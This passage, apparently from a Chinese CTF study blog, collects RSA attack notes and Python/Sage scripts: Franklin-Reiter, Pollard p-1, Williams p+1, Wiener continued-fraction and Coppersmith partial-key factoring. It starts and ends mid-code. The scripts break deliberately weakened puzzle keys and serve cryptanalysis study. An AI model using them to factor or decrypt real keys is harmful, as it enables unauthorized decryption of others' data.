class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">r = gmpy2.next_prime(p*q)</span><br><span class="line">n = p*q*r</span><br></pre></td></tr></table></figure><p>出于某种原因,你没有拿到n的另一半数字的phi,怎么解密?</p><p>这里就要引出RSA解密时一个比较重要的性质:对单个质因子即可解密.即RSA只让e对随便一个质数的phi取inv,然后d对这个质数p取模,也能还原出flag.(RSA这下死透了…)</p><h3 id="5-给出-p-q-q-p">5 给出 $p^q+q^p$</h3><p>设 $g=p^q+q^p$ ,有$$g\equiv p\mod q,g\equiv q\mod p$$于是$$p|(g-q),q|(g-p)$$$$(g-p)(g-q)\equiv 0\mod n$$$$g\equiv p+q\mod n$$所以直接就出来了…</p><h3 id="6-已知-msg-2-a-msg-1-b-Franklin-Reiter-attack-相关消息攻击">6 已知 $msg_2=a*msg_1+b$ Franklin-Reiter attack 相关消息攻击</h3><p>据说要用多项式求gcd做…<br>得到的m是原信息.<a href="https://www.anquanke.com/post/id/213821">相关链接</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,a,b,c1,c2</span>):</span><br><span class="line">    R.&lt;X&gt; = Zmod(n)[]</span><br><span class="line">    f1 = X^e - c1</span><br><span class="line">    f2 = (a*X + b)^e - c2</span><br><span class="line">    m_ = GCD(f1,f2).coefficients()[<span class="number">0</span>] <span class="comment"># 返回的是首一多项式，coefficients()返回多项式各项式的系数，项式次数递增，所以第0项是常数 </span></span><br><span class="line">    <span class="keyword">return</span> Integer(n - m_) <span class="comment"># 由于tmp其实是 -m % n,所以这里给他转换回去。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()        <span class="comment"># 返回首一多项式，即多项式最高次的项式系数为1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> GCD(b, a % b)</span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line">b = </span><br><span class="line">a = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">m = franklinReiter(n,e,a,b,c1,c2)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><h3 id="flag长度129位-n长度2048位-然后三份密文得到了-m-2">flag长度129位,n长度2048位,然后三份密文得到了 $m^2$</h3><p>发现flag最大也不会大过几倍的n,所以查出来 $m^2$ 之后暴力试探 $m$ 的值.</p><h3 id="7-模意义思考">7 模意义思考</h3><p>如果给了一堆奇怪的模意义下的东西,考虑分拆:$$a\equiv b\mod nm$$则有$$a\equiv b\mod n$$多想想模意义能搞定一些题(迫真)</p><h2 id="8-给定-n-ppq-额外hint-invert-n-p-1-q-1">8 给定 $n=p<em>p</em>q$ ,额外hint=invert(n,(p-1)*(q-1))</h2><p>这个题居然是用费马小定理做的…<br>首先给出了hint是逆元关系,我们有 $n*hint=1+k_1(p-1)(q-1)$</p><blockquote><p>费马小定理:对于任意质数p和不能被p整除的整数a,有$$a^{p-1}\equiv 1\mod p$$</p></blockquote><p>则对于正整数a,我们有$$\begin{aligned}a^{n<em>hint}\equiv&amp; a^{1+k_1(p-1)(q-1)}\\\equiv&amp; a^{(1+k_1(p-1)(q-1))\mod (p-1)}\mod p\\\equiv&amp; a\mod p\end{aligned}$$所以我们有 $a^{n</em>hint}-a\equiv 0\mod p$ ,即 $a^{n*hint}-a=k_2p$<br>算出来前者直接对n取gcd即可.</p><h3 id="Pollard’s-p-1-method">Pollard’s p-1 method</h3><p>这个是裸的板子,条件是p-1能被分解为很多小质数的积</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">PollardMethod</span>(<span class="params">N: <span class="built_in">int</span></span>):<span class="comment"># 返回N的一个因子</span></span><br><span class="line">a=<span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> itertools.count(<span class="number">2</span>):</span><br><span class="line">a=<span class="built_in">pow</span>(a,n,N)</span><br><span class="line">g=gcd(a-<span class="number">1</span>,N)</span><br><span class="line"><span class="keyword">if</span> g==<span class="number">1</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> g==N:</span><br><span class="line">a+=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> g</span><br></pre></td></tr></table></figure><p>这个是魔改板子,条件是p-1还有一个很大的已知质数因子</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math,itertools</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pollard_p1_with_factor</span>(<span class="params">N: <span class="built_in">int</span>,known_factor: <span class="built_in">int</span>,B: <span class="built_in">int</span> = <span class="number">100000</span></span>):</span><br><span class="line">a=<span class="number">2</span></span><br><span class="line">M=known_factor</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">primes_upto</span>(<span class="params">n</span>):</span><br><span class="line">sieve=[<span class="literal">True</span>]*(n+<span class="number">1</span>)</span><br><span class="line">sieve[<span class="number">0</span>:<span class="number">2</span>]=[<span class="literal">False</span>,<span class="literal">False</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">int</span>(n**<span class="number">0.5</span>)+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> sieve[i]:</span><br><span class="line">sieve[i*i:n+<span class="number">1</span>:i]=[<span class="literal">False</span>]*<span class="built_in">len</span>(<span class="built_in">range</span>(i*i,n+<span class="number">1</span>,i))</span><br><span class="line"><span class="keyword">return</span> [p <span class="keyword">for</span> p,ok <span class="keyword">in</span> <span class="built_in">enumerate</span>(sieve) <span class="keyword">if</span> ok]</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> primes_upto(B):</span><br><span class="line">pk=p</span><br><span class="line"><span class="keyword">while</span> pk*p&lt;=B:</span><br><span class="line">pk*=p</span><br><span class="line">M*=pk</span><br><span class="line">aM=<span class="built_in">pow</span>(a,M,N)</span><br><span class="line">g=math.gcd(aM-<span class="number">1</span>,N)</span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span>&lt;g&lt;N:</span><br><span class="line"><span class="keyword">return</span> g</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">N = ...</span><br><span class="line">factor = ...</span><br><span class="line">p = pollard_p1_with_factor(N, factor)</span><br><span class="line"><span class="keyword">assert</span> N%p==<span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="Williams’-p-1-method">Williams’ p+1 method</h3><p>网上相关板子实在太少了,笔者这里补充一下.<br>这个是裸的板子,条件是p+1能被分解为很多小质数的积</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> primerange</span><br><span class="line">n = ...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mlucas</span>(<span class="params">v, a, n</span>):</span><br><span class="line">    v1, v2 = v, (v ** <span class="number">2</span> - <span class="number">2</span>) % n</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">bin</span>(a)[<span class="number">3</span>:]:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">            v1, v2 = (v1 ** <span class="number">2</span> - <span class="number">2</span>) % n, (v1 * v2 - v) % n</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v1, v2 = (v1 * v2 - v) % n, (v2 ** <span class="number">2</span> - <span class="number">2</span>) % n</span><br><span class="line">    <span class="keyword">return</span> v1</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">primegen</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> primerange(<span class="number">2</span>, <span class="number">10</span>**<span class="number">6</span>)  <span class="comment"># 生成到 10^6 的素数，够用了</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ilog</span>(<span class="params">x, b</span>):</span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x &gt;= b:</span><br><span class="line">        x //= b</span><br><span class="line">        l += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> l</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> count(<span class="number">1</span>):  <span class="comment"># 不断尝试新的 v</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> primegen():</span><br><span class="line">            e = ilog(isqrt(n), p)</span><br><span class="line">            <span class="keyword">if</span> e == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">                v = mlucas(v, p, n)</span><br><span class="line">            g = gcd(v - <span class="number">2</span>, n)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">1</span> &lt; g &lt; n:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">int</span>(g), <span class="built_in">int</span>(n // g)</span><br><span class="line">            <span class="keyword">if</span> g == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">p1, q1 = attack(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q1&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>这个是魔改板子,条件是p+1还有一个很大的已知质数因子</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt,gcd</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> primerange</span><br><span class="line">n=...</span><br><span class="line">known_factor=<span class="number">0x1337133701</span><span class="comment"># p+1 的已知大素因子</span></span><br><span class="line">max_other_factor=<span class="number">50000</span><span class="comment"># 其他因子的最大值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mlucas</span>(<span class="params">v,a,n</span>):</span><br><span class="line">v1,v2=v,(v**<span class="number">2</span>-<span class="number">2</span>)%n</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">bin</span>(a)[<span class="number">3</span>:]:</span><br><span class="line"><span class="keyword">if</span> bit==<span class="string">&quot;0&quot;</span>:</span><br><span class="line">v1,v2=(v1**<span class="number">2</span>-<span class="number">2</span>)%n,(v1*v2-v)%n</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">v1,v2=(v1*v2-v)%n,(v2**<span class="number">2</span>-<span class="number">2</span>)%n</span><br><span class="line"><span class="keyword">return</span> v1</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">primegen</span>(<span class="params">max_limit</span>):</span><br><span class="line"><span class="keyword">yield</span> <span class="keyword">from</span> primerange(<span class="number">2</span>,max_limit+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ilog</span>(<span class="params">x,b</span>):</span><br><span class="line">l=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> x&gt;=b:</span><br><span class="line">x//=b</span><br><span class="line">l+=<span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> l</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">optimized_attack</span>(<span class="params">n,known_factor,max_other_factor</span>):</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> count(<span class="number">1</span>):</span><br><span class="line">e=ilog(isqrt(n),known_factor)</span><br><span class="line"><span class="keyword">if</span> e&gt;<span class="number">0</span>:</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">v=mlucas(v,known_factor,n)</span><br><span class="line">g=gcd(v-<span class="number">2</span>,n)</span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span>&lt;g&lt;n:</span><br><span class="line"><span class="keyword">return</span> g,n//g</span><br><span class="line"><span class="keyword">if</span> g==n:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> primegen(max_other_factor):</span><br><span class="line">e=ilog(isqrt(n),p)</span><br><span class="line"><span class="keyword">if</span> e==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">combined_factor=known_factor*p</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">v=mlucas(v,combined_factor,n)</span><br><span class="line">g=gcd(v-<span class="number">2</span>,n)</span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span>&lt;g&lt;n:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(g),<span class="built_in">int</span>(n//g)</span><br><span class="line"><span class="keyword">if</span> g==n:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p1,q1=optimized_attack(n,known_factor,max_other_factor)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;验证: n = p * q = <span class="subst">&#123;p1*q1==n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;分解失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Wiener-Attack-维纳攻击-连分数攻击">Wiener Attack 维纳攻击 连分数攻击</h2><p>本质是求满足下面条件的d:$$ed=1+kp$$$$d&lt;p^{0.25}$$只要存在这个d和k,不需要管p是什么数,连分数能求出来答案(e和p已知).</p><p>看看下面的例题:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">pad = <span class="keyword">lambda</span> m, l: m + <span class="built_in">bytes</span>(random.randrange(<span class="number">256</span>)*<span class="built_in">bool</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="built_in">len</span>(m)))</span><br><span class="line">unpad = <span class="keyword">lambda</span> m: m[:m.index(<span class="number">0</span>)] <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">in</span> m <span class="keyword">else</span> m</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> <span class="built_in">pow</span>(<span class="number">3</span>, (p-<span class="number">1</span>)//<span class="number">2</span>, p) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> q % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> <span class="built_in">pow</span>(<span class="number">3</span>, (q-<span class="number">1</span>)//<span class="number">2</span>, q) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d = random.randrange(phi) | <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> GCD(d, (p**<span class="number">4</span>-<span class="number">1</span>)*(q**<span class="number">4</span>-<span class="number">1</span>)) == <span class="number">1</span>:</span><br><span class="line">        e = <span class="built_in">pow</span>(d, -<span class="number">1</span>, (p**<span class="number">4</span>-<span class="number">1</span>)*(q**<span class="number">4</span>-<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m: <span class="built_in">list</span>[<span class="built_in">int</span>], e: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_add</span>(<span class="params">a, b</span>):</span><br><span class="line">        <span class="keyword">return</span> [(aa + bb) % n <span class="keyword">for</span> aa, bb <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_mul</span>(<span class="params">a, b</span>):</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            (a[<span class="number">0</span>]*b[<span class="number">0</span>] - <span class="number">3</span>*a[<span class="number">3</span>]*b[<span class="number">1</span>] - <span class="number">3</span>*a[<span class="number">2</span>]*b[<span class="number">2</span>] - <span class="number">3</span>*a[<span class="number">1</span>]*b[<span class="number">3</span>]) % n,</span><br><span class="line">            (a[<span class="number">1</span>]*b[<span class="number">0</span>] + a[<span class="number">0</span>]*b[<span class="number">1</span>] - <span class="number">3</span>*a[<span class="number">3</span>]*b[<span class="number">2</span>] - <span class="number">3</span>*a[<span class="number">2</span>]*b[<span class="number">3</span>]) % n,</span><br><span class="line">            (a[<span class="number">2</span>]*b[<span class="number">0</span>] + a[<span class="number">1</span>]*b[<span class="number">1</span>] + a[<span class="number">0</span>]*b[<span class="number">2</span>] - <span class="number">3</span>*a[<span class="number">3</span>]*b[<span class="number">3</span>]) % n,</span><br><span class="line">            (a[<span class="number">3</span>]*b[<span class="number">0</span>] + a[<span class="number">2</span>]*b[<span class="number">1</span>] + a[<span class="number">1</span>]*b[<span class="number">2</span>] + a[<span class="number">0</span>]*b[<span class="number">3</span>]) % n</span><br><span class="line">        ]</span><br><span class="line">    c = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    dbl = m[:]</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">reversed</span>(<span class="built_in">bin</span>(e)[<span class="number">2</span>:])):</span><br><span class="line">        <span class="keyword">if</span> b:</span><br><span class="line">            c = _mul(c, dbl)</span><br><span class="line">        dbl = _mul(dbl, dbl)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">m = [</span><br><span class="line">    bytes_to_long(pad(flag[:<span class="built_in">len</span>(flag)//<span class="number">4</span>], <span class="number">255</span>)),</span><br><span class="line">    bytes_to_long(pad(flag[<span class="built_in">len</span>(flag)//<span class="number">4</span>:<span class="number">2</span>*<span class="built_in">len</span>(flag)//<span class="number">4</span>], <span class="number">255</span>)),</span><br><span class="line">    bytes_to_long(pad(flag[<span class="number">2</span>*<span class="built_in">len</span>(flag)//<span class="number">4</span>:<span class="number">3</span>*<span class="built_in">len</span>(flag)//<span class="number">4</span>], <span class="number">255</span>)),</span><br><span class="line">    bytes_to_long(pad(flag[<span class="number">3</span>*<span class="built_in">len</span>(flag)//<span class="number">4</span>:], <span class="number">255</span>))</span><br><span class="line">]</span><br><span class="line">c = encrypt(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>hint:这是一个“四次扩环” $\mathbb{Z}_N(t)/(t^4+3) \cong \mathbb{F}_p(\sqrt[4]{-3}) \times \mathbb{F}_q(\sqrt[4]{-3})$ 上的RSA.</p><p>不要被吓跑…<br>即使是放到了环上,由于欧拉定理,RSA依旧满足ed加解密的性质.p和q不是连分数且p和q没关系,所以不能直接分解n.<br>但是我们发现d在 $n^4$ 下似乎很小,所以对这个e和d和 $n^4$ 使用连分数攻击,就能求出d,进而恢复明文.</p><h3 id="CopperSmith">CopperSmith</h3><p>只知道一个质数多少位,然后剩下的不知道,你要尝试分解n…<br>这里不扯淡,把理论扔一边,讲怎么写Sage脚本,怎么调参.</p><p><strong>调参</strong> :beta是pq相对的大小关系,一般取 <code>0.3-0.5</code> .<br>epsilon是格的大小,越小越精确(算的时间越长),取 <code>0.01-0.5</code> .</p><h4 id="2048位知道前1108位不知道后940位">2048位知道前1108位不知道后940位:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">n = ...</span><br><span class="line">p_high = ... <span class="comment"># 16进制形式的前1108位</span></span><br><span class="line">e = ...</span><br><span class="line">c = ...</span><br><span class="line"><span class="comment"># 缺失位数</span></span><br><span class="line">missing_bits = <span class="number">940</span></span><br><span class="line"><span class="comment"># 计算p_known = p_high &lt;&lt; missing_bits</span></span><br><span class="line">p_known = p_high * (<span class="number">2</span> ** missing_bits)</span><br><span class="line"><span class="comment"># 定义多项式</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p_known</span><br><span class="line"><span class="comment"># X是未知位的最大和值</span></span><br><span class="line">X = <span class="number">2</span> ** missing_bits  <span class="comment"># 因为x小于2^940</span></span><br><span class="line">roots = f.small_roots(X=X, beta=<span class="number">0.5</span>, epsilon=<span class="number">0.03</span>)</span><br><span class="line"><span class="keyword">if</span> roots:</span><br><span class="line">x0 = roots[<span class="number">0</span>]</span><br><span class="line">p = p_known + x0</span><br><span class="line"><span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p found:&quot;</span>, p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Found candidate but not factor.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;No roots found.&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="知道低位400求高位112">知道低位400求高位112</h3><p>这个码跑的比上面的快超级多,不知道为什么…</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n=</span><br><span class="line">pl=</span><br><span class="line">x=Zmod(n)[<span class="string">&#x27;x&#x27;</span>].gen()</span><br><span class="line">f=x*<span class="number">2</span>**<span class="number">400</span>+pl</span><br><span class="line">f.monic().small_roots(X=<span class="number">2</span>**<span class="number">112</span>,beta=<span class="number">0.49</span>,epsilon=<span class="number">0.02</span>)</span><br></pre></td></tr></table></figure><h3 id="3q-给定n-p-q-3-以及q的高381位-尝试分解pq">3q: 给定n=p*(q^3) 以及q的高381位,尝试分解pq:</h3><p>GPT告诉我说要构造一个模n等于0的多项式然后跑copper,然后管理员告诉我说这个题并不是二元copper.<br>得出结论:直接在原有的板子上修改即可(不是哥们,怎么随便一解就出来了,跑的飞快).</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 